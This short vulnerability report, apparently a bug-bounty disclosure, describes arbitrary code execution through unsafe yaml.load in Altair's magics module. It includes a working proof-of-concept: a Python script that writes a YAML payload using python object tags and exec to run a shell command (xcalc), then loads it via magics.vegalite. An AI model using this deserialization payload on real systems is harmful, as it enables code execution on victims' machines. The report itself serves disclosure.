### üíª Technical Description *
Yaml.load was exploitable to Arbitrary Code Execution
### üêõ Proof of Concept (PoC) *
* run the exploit code
```
import os
# installation
os.system("pip install altair vega_datasets")
#
import altair._magics as magics
payload = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
with open("exploit.yml","w+") as cell :
    cell.write(payload)
with open("exploit.yml","r+") as cell :
    magics.vegalite("1",cell)
```
* calc will be popped after executing the exploit code.
